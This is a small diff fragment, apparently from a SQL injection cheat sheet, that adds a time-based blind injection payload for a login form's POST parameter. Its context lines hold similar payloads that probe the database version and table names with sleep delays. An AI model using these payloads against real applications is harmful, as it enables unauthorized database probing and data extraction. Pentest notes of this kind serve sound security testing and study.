@@ -916,6 +916,9 @@ select if ((select substr(table_name,1,1) from information_schema.tables where t
 1' and if ((select version()) like "13%", sleep(10), null); --+
 
 
+Login based, post parameter - ") or sleep(15)#
+
+
 
 
                                                                      out file
